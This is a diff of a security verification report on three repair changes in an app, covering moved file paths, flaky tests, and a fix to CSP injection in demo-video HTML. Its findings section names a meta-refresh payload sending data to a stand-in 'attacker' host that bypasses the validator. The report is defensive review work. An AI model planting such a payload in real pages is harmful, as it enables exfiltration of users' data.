@@ -12,7 +12,7 @@ Base: `a0acd67c1895386c08e843da84b630619b0acafb`. Three repair commits land, one
 
 Combined diff (`git diff --stat a0acd67c..HEAD` over the three PRDs' own files): 7 files,
 +192/-21 — `src/main/lib/smfileHeaders.cjs` (new), `src/main/lib/__tests__/smfileHeaders.test.cjs`
-(new), `src/main/index.cjs`, `src/main/lib/projectHomeAdminRoutes.cjs`,
+(new), `src/main/index.cjs`, `src/main/lib/feedback-remote/projectHomeAdminRoutes.cjs`,
 `src/main/__tests__/projectHomeAdminRoutes.test.cjs`, `src/renderer/components/ChatTranscriptTurn.tsx`,
 `src/renderer/components/__tests__/ChatTranscriptTurn.streaming.test.tsx`.
 `src/renderer/components/epics/__tests__/EpicDetail.test.tsx` (listed in PRD 1477's Files section)
@@ -31,10 +31,10 @@ failures on the first run, both confirmed environment artifacts, not regressions
   tripping `scripts/scheduler-mcp-server.cjs:516`'s self-queue refusal inside otherwise-unrelated
   fixtures. Re-ran with `env -u SM_SCHEDULER_JOB_SLUG -u SM_SCHEDULER_JOB_MAY_QUEUE` → that file goes
   7/7 green. Unrelated file, not touched by any of the three repair commits.
-- `src/main/lib/__tests__/gitExec.test.cjs` — `execGit respects a short timeout` asserts a 1ms
+- `src/main/lib/git/__tests__/gitExec.test.cjs` — `execGit respects a short timeout` asserts a 1ms
   timeout rejects a spawned `git --version`; on this machine `git --version` returns before the 1ms
   deadline fires, so the assertion fails deterministically (reproduced twice, isolated and full-suite
-  run). `git log a0acd67c..HEAD -- src/main/lib/gitExec.cjs src/main/lib/__tests__/gitExec.test.cjs`
+  run). `git log a0acd67c..HEAD -- src/main/lib/git/gitExec.cjs src/main/lib/git/__tests__/gitExec.test.cjs`
   is empty — neither file was touched by this plan. Pre-existing timing flake, not a regression.
 
 Re-running the full suite with those two env vars unset leaves exactly this one pre-existing
@@ -58,7 +58,7 @@ purely the job-env leak and nothing else broke.
 
 ## repair-demo-video-csp-injection (1476) — VERIFIED; exploit + 2 new bypasses re-run against landed code
 
-- `injectCsp` (`src/main/lib/projectHomeAdminRoutes.cjs:95-110`) now strips any existing CSP meta and
+- `injectCsp` (`src/main/lib/feedback-remote/projectHomeAdminRoutes.cjs:95-110`) now strips any existing CSP meta and
   any leading `<!DOCTYPE …>`, then always returns `` `<!DOCTYPE html>${DEMO_VIDEO_CSP}${withoutDoctype}` ``
   — the CSP meta is unconditionally the first thing after the doctype, independent of where (or
   whether) a `<head>`-looking substring sits in the document.
@@ -149,7 +149,7 @@ the repair, not something the repair's own diff introduces.
 
 ## Findings
 
-**Critical — `src/main/lib/projectHomeAdminRoutes.cjs`'s widened `NETWORK_CHECKS` (and the PRD 1475
+**Critical — `src/main/lib/feedback-remote/projectHomeAdminRoutes.cjs`'s widened `NETWORK_CHECKS` (and the PRD 1475
 response-header CSP that backstops it) still do not cover navigation-based exfiltration via
 `<meta http-equiv="refresh" content="0;url=https://attacker/…">`.** Demonstrated live: both
 `validateDemoVideoHtml` and the actual served response's `connect-src 'none'`/`default-src 'none'`
